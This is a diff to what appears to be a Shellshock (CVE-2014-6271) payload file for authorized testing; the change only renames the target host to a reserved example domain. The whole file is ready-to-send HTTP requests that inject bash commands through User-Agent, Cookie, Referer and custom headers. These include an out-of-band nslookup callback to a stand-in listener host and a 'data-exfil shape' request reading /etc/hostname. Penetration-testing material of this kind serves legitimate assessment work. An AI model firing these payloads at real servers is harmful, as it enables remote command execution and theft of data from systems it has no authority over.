@@ -12,7 +12,7 @@
 # WHERE TO USE: /cgi-bin/*, /cgi-mod/*, appliance admin CGIs - any endpoint
 # whose Server header shows Apache+CGI handling.
 #
-# WHAT TO EDIT:  target.com  -> your authorized target;  /cgi-bin/status ->
+# WHAT TO EDIT:  target.example.invalid  -> your authorized target;  /cgi-bin/status ->
 # an actual CGI path. BENIGN marker only (/usr/bin/id or echo).
 #
 # CONFIRM: uid=... in the response, or OOB callback from the target.
@@ -21,22 +21,22 @@
 
 ### 1) classic User-Agent injection (in-band marker)
 GET /cgi-bin/status HTTP/1.1
-Host: target.com
+Host: target.example.invalid
 User-Agent: () { :;}; echo; echo; /bin/echo CVE-2014-6271-benign-marker; /usr/bin/id
 
 ### 2) OOB variant (EDIT: YOUR-OOB-HOST.example.invalid -> your listener)
 GET /cgi-bin/status HTTP/1.1
-Host: target.com
+Host: target.example.invalid
 User-Agent: () { :;}; /usr/bin/nslookup shellshock.YOUR-OOB-HOST.example.invalid
 
 ### 3) other exported headers (Cookie / Referer / custom)
 GET /cgi-bin/status HTTP/1.1
-Host: target.com
+Host: target.example.invalid
 Cookie: () { :;}; /usr/bin/id
 Referer: () { :;}; /usr/bin/id
 X-Custom: () { :;}; /usr/bin/id
 
 ### 4) data-exfil shape (benign single read, authorized only)
 GET /cgi-bin/status HTTP/1.1
-Host: target.com
+Host: target.example.invalid
 User-Agent: () { :;}; /bin/cat /etc/hostname; /usr/bin/id
